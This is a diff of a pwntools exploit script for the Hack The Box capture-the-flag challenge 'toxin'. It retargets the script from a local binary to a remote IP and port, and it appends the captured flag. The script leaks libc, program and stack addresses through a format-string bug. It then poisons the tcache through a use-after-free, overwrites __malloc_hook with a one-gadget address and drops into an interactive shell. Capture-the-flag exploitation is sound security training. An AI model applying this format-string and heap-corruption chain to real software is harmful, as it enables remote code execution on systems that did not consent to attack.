@@ -1,6 +1,8 @@
+#https://fdlucifer.github.io/2021/02/22/toxin/
+
 from pwn import *
 
-context.log_level = 'debug'
+#context.log_level = 'debug'
 
 def detect():
 	for i in range(20):
@@ -36,9 +38,10 @@ def edit_toxin(index,data):
 	io.sendline(data)
 	io.recv()
 
-#ip, port = '159.65.16.219',30003
-#io = remote(ip, port)
-io = process('./toxin')
+ip, port = '144.126.232.250',30005
+io = remote(ip, port)
+#io = process('./toxin')
+#io = gdb.debug('./toxin', 'break search_toxin')
 
 elf = ELF('./toxin')
 libc = ELF('./lib/libc.so.6')
@@ -72,6 +75,10 @@ echo 0 > /proc/sys/kernel/randomize_va_space
 
 pwndbg> disassemble 0x7ffff7a05b97
 Dump of assembler code for function __libc_start_main:
+p __libc_start_main 
+$1 = {int (int (*)(int, char **, char **), int, char **, int (*)(int, char **, 
+    char **), void (*)(void), void (*)(void), 
+    void *)} 0x7ffff7a05ab0 <__libc_start_main>
 
 >>> hex(elf.sym['main'])
 '0x11b5'
@@ -83,8 +90,8 @@ io.sendline('4')
 io.recvuntil('Enter search term:')
 io.sendline('%13$p')
 libc_start_main = int(io.recvline().strip().split(' ')[0],16)
-libc.address = libc_start_main - libc.sym['__libc_start_main']
-#print hex(libc.address)
+libc.address = libc_start_main - (0xb97-0xab0) - libc.sym['__libc_start_main'] 
+print 'libc base: '+hex(libc.address)
 
 io.recvuntil('>')
 io.sendline('4')
@@ -92,7 +99,14 @@ io.recvuntil('Enter search term:')
 io.sendline('%17$p')
 elf_main = int(io.recvline().strip().split(' ')[0],16)
 elf.address = elf_main - elf.sym['main']
-#print hex(elf.address)
+print 'elf base: '+hex(elf.address)
+
+io.recvuntil('>')
+io.sendline('4')
+io.recvuntil('Enter search term:')
+io.sendline('%1$p')
+elf_rip = int(io.recvline().strip().split(' ')[0],16)
+print 'stack: '+hex(elf_rip)
 
 '''
 add_toxin(0x70,0,"A"*8)
@@ -117,11 +131,12 @@ constraints:
 
 '''
 
-add_toxin(0x70,0,"A"*8)
+add_toxin(100,0,"A"*0x10)
 drink_toxin(0)
 edit_toxin(0,p64(elf.symbols["toxinfreed"] -0x13))
+#edit_toxin(0,p64(elf_rip+0xe))
 
-add_toxin(100,1,"C"*8)
+add_toxin(100,1,"B"*0x10)
 add_toxin(100,2, "\x00"*35 + p64(libc.symbols['__malloc_hook']) + p64(0)*3)
 edit_toxin(0,p64(libc.address + 0x10a38c))
 
@@ -133,3 +148,5 @@ io.recv()
 io.sendline("1")
 # ---
 io.interactive()
+
+#HTB{tc4ch3_t0x1n4t10n???_0r_tc4ch3_p01So1n1NG??+F0rm4t...4m@ZiNg!!!}
